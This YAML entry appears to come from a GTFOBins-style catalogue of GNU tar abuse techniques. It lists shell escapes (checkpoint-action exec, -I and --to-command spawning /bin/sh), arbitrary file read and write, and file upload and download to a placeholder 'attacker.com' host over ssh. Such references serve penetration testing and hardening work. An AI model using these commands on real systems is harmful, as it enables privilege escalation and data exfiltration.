---
functions:
  download:
  - code: |-
      tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh
    comment: |-
      The attacker box must have the `rmt` utility installed.
    contexts:
      sudo:
      suid:
      unprivileged:
    sender: ssh-server
    version: |-
      GNU
  file-read:
  - code: |-
      tar cf /dev/stdout /path/to/input-file -I 'tar xO'
    comment: |-
      The file is read then passed to the specified command (e.g., `tar xO`) via standard input.
    contexts:
      sudo:
      suid:
      unprivileged:
    version: |-
      GNU
  file-write:
  - code: |-
      echo DATA >/path/to/temp-file
      tar cf /path/to/temp-file.tar /path/to/temp-file
      tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@
    comment: |-
      The archive can also be prepared offline then uploaded to the target.
    contexts:
      sudo:
      suid:
      unprivileged:
    version: |-
      GNU
  shell:
  - code: |-
      tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
  - code: |-
      tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
    contexts:
      sudo:
      suid:
        code: |-
          tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
        shell: false
      unprivileged:
    version: |-
      GNU
  - code: |-
      echo '/bin/sh 0<&1' >/path/to/temp-file
      tar cf /path/to/temp-file.tar /path/to/temp-file
      tar xf /path/to/temp-file.tar --to-command /bin/sh
    comment: |-
      The archive can also be prepared offline then uploaded to the target.
    contexts:
      sudo:
      suid:
      unprivileged:
    version: |-
      GNU
  upload:
  - code: |-
      tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh
    comment: |-
      The attacker box must have the `rmt` utility installed.
    contexts:
      sudo:
      suid:
      unprivileged:
    receiver: ssh-server
    version: |-
      GNU
...
